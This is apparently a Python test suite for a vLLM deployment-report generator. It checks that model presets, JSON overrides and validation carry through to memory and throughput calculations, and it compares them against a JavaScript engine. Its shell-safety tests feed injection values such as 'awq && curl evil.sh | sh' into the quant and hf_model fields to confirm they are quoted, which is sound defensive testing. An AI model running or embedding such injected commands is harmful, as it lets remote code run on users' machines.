#!/usr/bin/env python3
"""Verify generate_report.py's cfg builders carry a preset's full architecture
into compute() — and that they do it by construction, not by naming fields.

parity.test.py extracts compute() with an AST trick that keeps reportlab out of
scope — but it cherry-picks a handful of top-level nodes and re-execs them with
only `math` in scope, so it cannot see from_json(), from_cli_args(), or
interactive_mode() at all. That blind spot is exactly how attn/swa_win/
swa_local/mla_dim, and separately max_ctx, went missing from every cfg
builder's key whitelist while compute() itself already handled them correctly:
nothing ever exercised the builders against PRESETS. This suite imports
generate_report as a real module instead, so it sees what the builders
actually return.

Checked:
  1. For every PRESETS entry, from_cli_args()/from_json()/interactive_mode()
     — including the actual computed numbers for interactive_mode, not just
     which keys arrive — must make compute() behave identically to
     arch_fields() applied to that preset directly. Not a hand-written second
     copy of what PRESETS should produce: that's itself a whitelist that
     silently stops covering a field the moment PRESETS gains one this file
     was never told about.
  2. Independently of arch_fields() entirely: Python's compute() must match
     index.html's computeInference(), driven by index.html's own MODEL_PRESETS
     table (extracted from source, not re-derived) — the JS engine as oracle.
  3. A field neither this file nor compute() has ever heard of still reaches
     cfg through every builder that starts from a preset, because those
     builders forward a preset's fields by default rather than by name.
  4. An explicit value in a JSON config wins over the preset it also selects,
     for architecture fields exactly as it already does for ctx/kv_bpp/etc —
     specifically checked in the vulnerable direction: a preset that defines
     NO swa/mla keys of its own, overridden into swa/mla, must still produce
     real non-zero KV — not attn flipped with the parameter that gives it
     meaning silently dropped, which is what "override restricted to keys
     the preset already defines" actually did.
  5. A wrong-typed value from raw JSON fails loudly and names the offending
     key, instead of crashing anonymously deep inside compute() (or worse,
     computing a confident wrong answer).
  6. hf_model/quant, both reachable from raw JSON, cannot inject shell syntax
     into the copy-pasteable vllm serve command.

Run:  python3 tests/report.test.py
"""
import contextlib
from datetime import datetime
import io
import json
import math
import os
import re
import subprocess
import sys
import tempfile
import types
import unittest.mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import generate_report as gr

pass_ct = fail_ct = 0

def test(name, fn):
    global pass_ct, fail_ct
    try:
        fn()
        print(f"  ok   {name}")
        pass_ct += 1
    except Exception as e:
        # Broad on purpose: a dropped key can surface as KeyError rather than
        # AssertionError, and that must be reported, not crash the suite
        # before every preset gets a chance to run.
        print(f"  FAIL {name}\n       {type(e).__name__}: {e}")
        fail_ct += 1


def dict_diff(got, want):
    """Field-by-field diff between two compute() outputs, for failure messages."""
    lines = []
    for k in sorted(set(got) | set(want)):
        if got.get(k) != want.get(k):
            lines.append(f"{k}: builder={got.get(k)!r} expected={want.get(k)!r}")
    return lines


def assert_match(got, want, label):
    diff = dict_diff(got, want)
    assert not diff, f"{label} disagrees with the hand-built architecture:\n       " + "\n       ".join(diff)


def write_json(obj):
    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w") as f:
        json.dump(obj, f)
    return path


# ---- shared request parameters, held constant so only architecture varies ----
# ctx must clear every preset's swa_win (max is llama4-109b's 8192) — otherwise
# a SWA preset's local layers never actually hit their cap within this context,
# and standard vs. swa produce the same KV size by coincidence, masking exactly
# the bug this suite exists to catch.
REQ = {"gpu": "h100-80", "ctx": 16384, "conc": 4, "n_gpu": 1, "nvlink": True, "kv_bpp": 2}
BPP = 0.5  # awq, in both from_cli_args (via --prec) and from_json (via "bpp")


def expected_cfg(pd):
    """A cfg built from PRESETS' own translation (arch_fields) plus the fixed
    request parameters above — deliberately NOT a hand-written second copy of
    the field list. A hand-written 'expected' dict is itself a parallel
    whitelist: it silently stops covering a field the moment one is added to
    PRESETS but not mirrored here, which is the exact failure mode this suite
    exists to catch, just moved into the test instead of the product. The
    JS-oracle check below provides independent ground truth that doesn't go
    through arch_fields() at all, so this isn't circular — it verifies the
    builders route through arch_fields() and merge the request fields without
    dropping or clobbering anything, which a hand-copied dict can't tell you
    once arch_fields() is the single source of truth for both sides.
    """
    cfg = gr.arch_fields(pd)
    cfg.update({
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "gpu": gr.GPUS[REQ["gpu"]], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
        # Off the card, as every builder copies it. Not an architecture field,
        # but compute() reads it, so a builder that dropped it would differ
        # from this cfg in every throughput figure.
        "perfKey": gr.GPUS[REQ["gpu"]]["perfKey"],
    })
    return cfg


def cli_args_for(preset_key):
    return types.SimpleNamespace(
        preset=preset_key, gpu=REQ["gpu"], prec="awq", ctx=REQ["ctx"],
        conc=REQ["conc"], ngpu=REQ["n_gpu"], no_nvlink=not REQ["nvlink"],
        fp8_kv=REQ["kv_bpp"] == 1,
    )


def run_interactive_with_preset(preset_key):
    """Drive interactive_mode() end to end via mocked stdin, selecting
    preset_key and the shared request parameters. Exercises the real function
    — the no-args default path a first-time user hits — not a stand-in for
    it. n_gpu=1 below means nvlink's value never reaches compute() (it only
    affects multi-GPU overhead/penalty), so answering it "1" here doesn't
    diverge from REQ["nvlink"]=True used everywhere else."""
    preset_idx = list(gr.PRESETS.keys()).index(preset_key) + 1
    gpu_idx = list(gr.GPUS.keys()).index(REQ["gpu"]) + 1
    answers = [
        str(preset_idx),   # "Select preset number (or 'custom')"
        str(gpu_idx),      # "Select GPU number"
        "1",                # "GPU count [1]" — 1 GPU, so the NVLink prompt is never asked
        "3",                # "Select [3]" precision -> INT4/AWQ
        "n",                # "FP8 KV cache? [y/n, default n]"
        str(REQ["ctx"]),   # "Context length [8192]"
        str(REQ["conc"]),  # "Concurrent requests [1]"
    ]
    with unittest.mock.patch("builtins.input", side_effect=answers), \
         contextlib.redirect_stdout(io.StringIO()):
        return gr.interactive_mode()


print("\nPreset architecture reaches compute() (from_cli_args / from_json / interactive_mode vs. arch_fields)")
for key, pd in gr.PRESETS.items():
    want = gr.compute(expected_cfg(pd))

    def check_cli(key=key, want=want):
        got = gr.compute(gr.from_cli_args(cli_args_for(key)))
        assert_match(got, want, "from_cli_args")
    test(f"{key}: from_cli_args carries full architecture into compute()", check_cli)

    def check_json(key=key, want=want):
        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            got = gr.compute(gr.from_json(path))
        finally:
            os.remove(path)
        assert_match(got, want, "from_json")
    test(f"{key}: from_json carries full architecture into compute()", check_json)

    def check_interactive(key=key, want=want):
        # Numbers, not just key routing (routing alone is the separate
        # property test further down). A corrupted interactive_mode that,
        # say, silently halved h_dim would still route every key through
        # fine and only show up here, in what compute() does with the value.
        got = gr.compute(run_interactive_with_preset(key))
        assert_match(got, want, "interactive_mode")
    test(f"{key}: interactive_mode carries full architecture into compute()", check_interactive)


# ---- JS engine as oracle ---------------------------------------------------
# Runs index.html's OWN MODEL_PRESETS table (not Python's PRESETS, not
# arch_fields — an entirely separate extraction) through its OWN
# computeInference(), the same way applyPreset() + buildState() would for a
# user selecting that preset in the browser. This is independent ground
# truth: it cannot be fooled by a bug in arch_fields() itself, only by the two
# engines genuinely disagreeing.
JS_ORACLE_RUNNER = r"""
const fs=require('fs');
const html=fs.readFileSync(process.argv[1],'utf8');
const gib=html.match(/^const GIB = .+;$/m)[0];
const perf=html.match(/^const PERF = \{[\s\S]*?\n\};$/m)[0];
const mp=html.match(/^const MODEL_PRESETS = \{[\s\S]*?\n\};$/m)[0];
/* computeInference() derives the TP/DP split it returns through
   parallelismFor()/splitParallelism(); they come into scope with it the same
   way GIB, PERF and MODEL_PRESETS do. Adjacent in the source, so one slice. */
const spS=html.indexOf('function splitParallelism('), spE=html.indexOf('function renderStrategyBadges');
if(spS===-1||spE===-1) throw new Error('splitParallelism()/parallelismFor() not found in index.html');
const split=html.slice(spS,spE);
const s=html.indexOf('function computeInference(state) {'), e=html.indexOf('\n}\n',s);
const scope=new Function(`${gib}\n${perf}\n${mp}\n${split}\n${html.slice(s,e+2)}; return {computeInference, MODEL_PRESETS};`)();
const gt=html.match(/^const GPU_TABLE = \{[\s\S]*?\n\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
/* Keyed by catalog slug. Keying by display name meant reproducing
   getGpuSpec()'s " GB" -> "GB" rewrite on both sides of this file, and the two
   copies did not agree: the JS here anchored on /$/ while the Python below did
   not. They match on all twelve current names and diverge on the first name
   with " GB" anywhere but the end — which is the shape a multi-GCD board's name
   takes. The failure would have been an opaque "cannot read properties of
   undefined", not a diff. */
const G={};
for(const [k,g] of Object.entries(GPU_TABLE)){
  G[k]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops,
        name:g.name.replace(/ GB$/,'GB'),perfKey:g.perfKey};
}
const req=JSON.parse(process.argv[2]);
const g=G[req.gpu];
if(!g) throw new Error('no GPU_TABLE row for slug '+req.gpu);
const out={};
for (const key of Object.keys(scope.MODEL_PRESETS)) {
  const p=scope.MODEL_PRESETS[key];
  out[key]=scope.computeInference({
    params:p.p, activePercent:p.a, bytesPerParam:req.bpp, layers:p.l,
    kvHeads:p.kv, headDim:p.hd, sharedExperts:p.se||0,
    contextLength:req.ctx, concurrency:req.conc, gpuCount:req.n_gpu,
    hasNVLink:req.nvlink, kvBytesPerValue:req.kv_bpp,
    gpuGB:g.gb, gpuBandwidth:g.bw, gpuTFLOPS:g.tf, gpuHyperCost:g.h,
    gpuSpecCost:g.sp, gpuSpotCost:g.st, gpuName:g.name,
    // The key PERF is looked up by, off the row as readInputState() takes it.
    perfKey:g.perfKey,
    attnMode:p.attn||'standard', swaWindow:p.swaWin||0,
    swaLocalLayers:p.swaLocal||0, mlaLatentDim:p.mlaDim||0,
    modelMaxCtx:p.maxCtx||131072,
  });
}
console.log(JSON.stringify(out));
"""

# Same field mapping parity.test.py uses — duplicated rather than imported,
# consistent with every test file here being runnable and readable on its own.
JS_FIELDS = [
    ("weights_gb", "weightsGB", 0.01), ("kv_gb", "kvCacheGB", 0.01),
    ("act_gb", "activationsGB", 0.01), ("total_gb", "totalGB", 0.01),
    ("per_total", "perGPU.total", 0.01), ("free_kv", "freeForKVCache", 0.01),
    ("max_ctx_1", "maxContextSingleUser", 1), ("max_conc_8k", "maxConcurrentAt8K", 1),
    ("single_tok", "singleStreamTokS", 1), ("agg_tok", "aggregateTokS", 1),
    ("agg_obs_lo", "aggregateObservedLoTokS", 1), ("agg_obs_hi", "aggregateObservedHiTokS", 1),
    ("per_user_load", "perUserAtLoadTokS", 1), ("eff_batch", "effectiveBatch", 0),
    ("max_batch_kv", "maxBatchByKV", 0), ("ttft_ms", "ttftMs", 1),
    ("sat_batch", "saturatedBatch", 0), ("sat_tok", "saturatedTokS", 1),
    ("kv_saved_by_prefix_gb", "kvSavedByPrefixGB", 0.01),
]
js_dig = lambda d, p: d["perGPU"]["total"] if p == "perGPU.total" else d[p]

print("\nJS engine as oracle (index.html's own MODEL_PRESETS + computeInference)")
req_for_js = dict(REQ, bpp=BPP)
proc = subprocess.run(
    ["node", "-e", JS_ORACLE_RUNNER, os.path.join(ROOT, "index.html"), json.dumps(req_for_js)],
    capture_output=True, text=True)
js_oracle = {}
if proc.returncode:
    print("  FAIL node runner failed:\n       " + proc.stderr.replace("\n", "\n       "))
    fail_ct += 1
else:
    js_oracle = json.loads(proc.stdout)

for key in gr.PRESETS:
    def check_js_oracle(key=key):
        js = js_oracle[key]
        py = gr.compute(gr.from_cli_args(cli_args_for(key)))
        bad = []
        for pk, jk, tol in JS_FIELDS:
            a, b = py[pk], js_dig(js, jk)
            if abs(a - b) > max(tol, abs(b) * 0.001):
                bad.append(f"{pk}: py={a:.6g} js={b:.6g}")
        assert not bad, "compute() vs. index.html's computeInference():\n       " + "\n       ".join(bad)
    test(f"{key}: matches the JS engine driven by index.html's own MODEL_PRESETS", check_js_oracle)


print("\nfrom_json raw (non-preset) branch")

def check_raw_defaults_to_standard():
    # An existing JSON config with no attention keys at all must keep behaving
    # exactly as it did before this fix: standard attention.
    path = write_json({
        "params": 8, "layers": 32, "kv_heads": 8, "h_dim": 128,
        "ctx": 8192, "conc": 4, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn", "standard") == "standard", f"attn defaulted to {cfg.get('attn')!r}"
    assert cfg.get("swa_win", 0) == 0 and cfg.get("swa_local", 0) == 0 and cfg.get("mla_dim", 0) == 0
    explicit_standard = dict(cfg, attn="standard", swa_win=0, swa_local=0, mla_dim=0)
    assert_match(gr.compute(cfg), gr.compute(explicit_standard), "raw cfg vs. explicit-standard cfg")

test("a raw JSON config with no attention keys still gets standard attention", check_raw_defaults_to_standard)


def check_raw_swa_override_is_honored():
    path = write_json({
        "params": 26, "layers": 30, "kv_heads": 8, "h_dim": 256,
        "attn": "swa", "swa_win": 1024, "swa_local": 25,
        "ctx": 32768, "conc": 8, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "swa" and cfg.get("swa_win") == 1024 and cfg.get("swa_local") == 25, \
        f"attention keys not carried through from raw JSON: {cfg}"
    swa_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    # SWA caps most layers' KV at the window; at this context it must cost
    # strictly less than paying full standard attention for all 30 layers.
    assert swa_kv < standard_kv, f"swa_kv={swa_kv} standard_kv={standard_kv} — SWA had no effect"

test("a raw JSON config's explicit swa attention keys are carried into compute()",
     check_raw_swa_override_is_honored)


def check_raw_mla_override_is_honored():
    path = write_json({
        "params": 671, "layers": 61, "kv_heads": 128, "h_dim": 56, "shared_exp": 1,
        "attn": "mla", "mla_dim": 576,
        "ctx": 16384, "conc": 8, "n_gpu": 8, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "mla" and cfg.get("mla_dim") == 576, \
        f"attention keys not carried through from raw JSON: {cfg}"
    mla_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert mla_kv < standard_kv, f"mla_kv={mla_kv} standard_kv={standard_kv} — MLA had no effect"

test("a raw JSON config's explicit mla attention keys are carried into compute()",
     check_raw_mla_override_is_honored)


print("\nfrom_json: explicit JSON values override the selected preset's")

def check_preset_branch_raw_override_wins():
    # A JSON that selects a preset but also sets one of its architecture
    # fields explicitly must honor the explicit value — the same rule ctx and
    # kv_bpp already follow in this same branch. gemma4-31b is swa; forcing
    # attn back to standard makes the divergence impossible to paper over
    # with a coincidental match.
    path = write_json({
        "preset": "gemma4-31b", "attn": "standard", "gpu": REQ["gpu"],
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["attn"] == "standard", f"explicit JSON override lost to the preset: attn={cfg['attn']!r}"
    # Everything the JSON didn't override still comes from the preset.
    assert cfg["layers"] == gr.PRESETS["gemma4-31b"]["l"]
    assert cfg["max_ctx"] == gr.PRESETS["gemma4-31b"]["max_ctx"]

test("from_json: an explicit attn in the JSON overrides the selected preset's",
     check_preset_branch_raw_override_wins)


def check_preset_branch_honors_hf_model_override():
    # This tool's origin story is an air-gapped deployment: "pick a preset,
    # point it at my local weights" is the obvious thing to write in a
    # config. hf_model/model_name are set unconditionally by the request
    # layer below the override merge, so it's not enough for them to survive
    # the merge — they must actually win over the preset's own value there.
    path = write_json({
        "preset": "llama31-8b", "hf_model": "/opt/models/my-local-copy",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["hf_model"] == "/opt/models/my-local-copy", \
        f"hf_model override lost to the preset: {cfg['hf_model']!r}"
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve /opt/models/my-local-copy \\" in cmd, \
        f"the emitted command still points at the network model id, not the local path:\n{cmd}"

test("from_json: an explicit hf_model in the JSON overrides the selected preset's",
     check_preset_branch_honors_hf_model_override)


def check_preset_branch_honors_model_name_override():
    path = write_json({
        "preset": "llama31-8b", "model_name": "My Local 8B",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["model_name"] == "My Local 8B", \
        f"model_name override lost to the preset: {cfg['model_name']!r}"

test("from_json: an explicit model_name in the JSON overrides the selected preset's",
     check_preset_branch_honors_model_name_override)


def check_standard_preset_overridden_to_swa_gets_real_kv():
    # The vulnerable direction: llama31-8b defines no SWA keys at all, so
    # arch_fields(pd) never puts swa_win/swa_local in cfg to begin with. An
    # override merge restricted to "keys the preset already defines" — the
    # previous, broken version of this — let attn flip to swa while silently
    # dropping the window and local-layer count. That is not "override
    # ignored", it is "override half-applied": every local layer's KV comes
    # out empty instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "swa_local": 16,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("swa_win") == 4096 and cfg.get("swa_local") == 16, \
        f"swa_win/swa_local dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — swa_win/swa_local were dropped, so every local layer's KV is empty"
    assert kv_gb < standard_kv, f"swa_kv={kv_gb} standard_kv={standard_kv} — SWA had no effect"

test("from_json: llama31-8b (defines no swa keys) overridden to swa gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_swa_gets_real_kv)


def check_standard_preset_overridden_to_mla_gets_real_kv():
    # Same vulnerability, mla direction — this is the exact N1 regression:
    # attn flipped to mla while mla_dim silently stayed absent, computing a
    # confident kv_gb of 0.0 and fits=True instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "mla", "mla_dim": 576,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("mla_dim") == 576, f"mla_dim dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — mla_dim was dropped, exactly the N1 regression"

test("from_json: llama31-8b (defines no mla keys) overridden to mla gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_mla_gets_real_kv)


def check_preset_branch_honors_runtime_overrides():
    # shared_prefix/prefix_caching are never defined by any preset, so the
    # old "only keys the preset defines" filter dropped them here while the
    # raw (non-preset) branch already honoured them via dict(raw) — the same
    # inconsistency as the attn override, for a different field class.
    path = write_json({
        "preset": "llama31-8b", "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
        "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
        "kv_bpp": REQ["kv_bpp"], "shared_prefix": 4096, "prefix_caching": True,
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("shared_prefix") == 4096, f"shared_prefix dropped by the preset path: {cfg}"
    assert cfg.get("prefix_caching") is True, f"prefix_caching dropped by the preset path: {cfg}"

test("from_json: shared_prefix/prefix_caching reach cfg through the preset path too",
     check_preset_branch_honors_runtime_overrides)


print("\nMalformed raw JSON fails loudly and names the offending key")

def assert_raises_naming(fn, exc_type, needle):
    """Call fn() and require it to raise exc_type with needle in the message
    — proves a bad value fails loudly and names the key, instead of crashing
    anonymously deep inside compute() or, worse, silently computing zero."""
    try:
        result = fn()
    except exc_type as e:
        assert needle in str(e), f"{exc_type.__name__} raised but doesn't mention {needle!r}: {e}"
        return
    raise AssertionError(f"expected {exc_type.__name__} mentioning {needle!r}, got a normal return: {result!r}")


def check_bad_max_ctx_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "max_ctx": "lots", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "max_ctx")
    finally:
        os.remove(path)

test("a non-numeric max_ctx in raw JSON raises a clear, key-named error",
     check_bad_max_ctx_type_fails_clearly)


def check_bad_swa_local_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "attn": "swa",
                        "swa_local": "many", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("a non-numeric swa_local in raw JSON raises a clear, key-named error",
     check_bad_swa_local_type_fails_clearly)


def check_bad_preset_override_type_fails_clearly():
    # Same validation applies to the preset-branch override merge, not just
    # the raw (non-preset) branch.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "mla_dim": "bad", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("a non-numeric architecture override on a preset-selecting JSON raises a clear, key-named error",
     check_bad_preset_override_type_fails_clearly)


def check_prefix_caching_accepts_bool_and_0_1():
    # JSON authors routinely write 1/0 for booleans. isinstance(1, bool) is
    # False, so a naive isinstance() check rejects the reasonable input.
    for val in (0, 1, False, True):
        path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                            "prefix_caching": val, "gpu": "h100-80"})
        try:
            cfg = gr.from_json(path)  # must not raise
        finally:
            os.remove(path)
        assert cfg.get("prefix_caching") == val, f"prefix_caching={val!r} was not preserved: {cfg}"

test("prefix_caching accepts 0/1 as well as true/false", check_prefix_caching_accepts_bool_and_0_1)


def check_nonsensical_prefix_caching_value_still_rejected():
    # Widening to accept 0/1 must not widen all the way to "anything".
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                        "prefix_caching": 2, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "prefix_caching")
    finally:
        os.remove(path)

test("a prefix_caching value that isn't 0/1/bool is still rejected",
     check_nonsensical_prefix_caching_value_still_rejected)


def check_bool_rejected_for_a_numeric_field():
    # isinstance(True, int) is True in Python — a stray boolean must not
    # silently pass as a valid layer count.
    path = write_json({"params": 8, "layers": True, "kv_heads": 8, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "layers")
    finally:
        os.remove(path)

test("a bool value for a numeric field like layers is rejected, not silently accepted as 1",
     check_bool_rejected_for_a_numeric_field)


def check_mla_without_mla_dim_is_rejected():
    # Nothing is being dropped here — the user under-specified — but the
    # symptom is identical to the N1 bug: attn='mla' with mla_dim absent
    # computes kv_gb=0.0 and fits=True instead of a real number.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("attn='mla' without mla_dim is rejected instead of silently computing kv_gb=0",
     check_mla_without_mla_dim_is_rejected)


def check_swa_without_window_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_local": 16, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_win")
    finally:
        os.remove(path)

test("attn='swa' without swa_win is rejected instead of silently computing kv_gb=0",
     check_swa_without_window_is_rejected)


def check_swa_without_local_layers_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("attn='swa' without swa_local is rejected instead of silently computing kv_gb=0",
     check_swa_without_local_layers_is_rejected)


print("\nvLLM command interpolation is shell-safe")

def check_quant_is_shell_quoted():
    # quant now reaches build_vllm_cmd() from raw JSON via the default-allow
    # override path — the same class of exposure hf_model already had, but
    # newly reachable for quant since the arch_fields rewrite.
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               perfKey=gr.GPUS["h100-80"]["perfKey"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, quant="awq && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before quant is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "--quantization 'awq && curl evil.sh | sh' \\" in cmd, f"quant was not shell-quoted:\n{cmd}"

test("a malicious quant value is shell-quoted in the generated command, not interpolated raw",
     check_quant_is_shell_quoted)


def check_hf_model_is_shell_quoted():
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               perfKey=gr.GPUS["h100-80"]["perfKey"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, hf_model="foo && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before hf_model is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "vllm serve 'foo && curl evil.sh | sh' \\" in cmd, f"hf_model was not shell-quoted:\n{cmd}"

test("a malicious hf_model value is shell-quoted in the generated command, not interpolated raw",
     check_hf_model_is_shell_quoted)


def check_ordinary_values_are_not_needlessly_quoted():
    # shlex.quote() must be invisible for the common case — no stray quotes
    # around a plain HuggingFace id or quant name that never needed escaping.
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve meta-llama/Llama-3.1-8B-Instruct \\" in cmd, \
        f"an ordinary HF model id got quoted unnecessarily:\n{cmd}"
    assert "--quantization awq \\" in cmd, f"an ordinary quant value got quoted unnecessarily:\n{cmd}"

test("ordinary hf_model/quant values render unquoted, exactly as before",
     check_ordinary_values_are_not_needlessly_quoted)


print("\nDefault-allow property (a field neither compute() nor this file has heard of)")

def check_unrecognised_field_reaches_every_builder():
    # The exact scenario this round exists to prevent: a field added to
    # PRESETS that compute() doesn't read yet, or reads under a name nothing
    # in this file has been told about. If any builder still needs to be
    # taught this key's name before forwarding it, this fails — that is the
    # entire difference between default-allow and a whitelist with one more
    # entry in it.
    key = "llama31-8b"
    original = dict(gr.PRESETS[key])
    gr.PRESETS[key] = dict(original, attn_sink=4)
    try:
        cli_cfg = gr.from_cli_args(cli_args_for(key))
        assert cli_cfg.get("attn_sink") == 4, f"from_cli_args dropped attn_sink: {cli_cfg}"

        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            json_cfg = gr.from_json(path)
        finally:
            os.remove(path)
        assert json_cfg.get("attn_sink") == 4, f"from_json dropped attn_sink: {json_cfg}"

        interactive_cfg = run_interactive_with_preset(key)
        assert interactive_cfg.get("attn_sink") == 4, f"interactive_mode dropped attn_sink: {interactive_cfg}"
    finally:
        gr.PRESETS[key] = original

test("a PRESETS field compute() has never heard of still reaches cfg through every builder",
     check_unrecognised_field_reaches_every_builder)


# ---- NVLink is a property of the card, not a default -----------------------
# Every builder here defaulted nvlink to True. Seven of the twelve catalogued
# cards have no NVLink at all, so a 2x RTX 4090 report claimed an interconnect
# that does not exist and took the 0.85 multi-GPU scaling that goes with it.
# The gate is the catalog's `form`, and index.html gates on the same field —
# parity.test.py compares the two answers card by card.
print("\nNVLink is gated on the card, in every builder")

NO_NVLINK_GPU = "rtx4090-24"   # consumer board, no NVLink
NVLINK_GPU = "a100-80"         # SXM board, has it

def check_cli_gates_nvlink():
    for key, gpu in gr.GPUS.items():
        args = cli_args_for("llama31-8b")
        args.gpu, args.ngpu, args.no_nvlink = key, 2, False
        cfg = gr.from_cli_args(args)
        want = gr.supports_nvlink(gpu)
        assert cfg["nvlink"] == want, (
            f"{key}: --no-nvlink absent gave nvlink={cfg['nvlink']!r}, "
            f"but form={gpu['form']!r} means {want}")

test("from_cli_args grants NVLink to exactly the cards that have it", check_cli_gates_nvlink)


def check_json_cannot_assert_nvlink():
    path = write_json({"preset": "llama31-8b", "gpu": NO_NVLINK_GPU, "n_gpu": 2, "nvlink": True})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["nvlink"] is False, (
        f'a JSON config asking for NVLink on {NO_NVLINK_GPU} got {cfg["nvlink"]!r}')

test("from_json: an explicit nvlink:true on a card without NVLink is refused, not honoured",
     check_json_cannot_assert_nvlink)


def check_raw_json_cannot_assert_nvlink():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                       "gpu": NO_NVLINK_GPU, "n_gpu": 2, "nvlink": True})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["nvlink"] is False, (
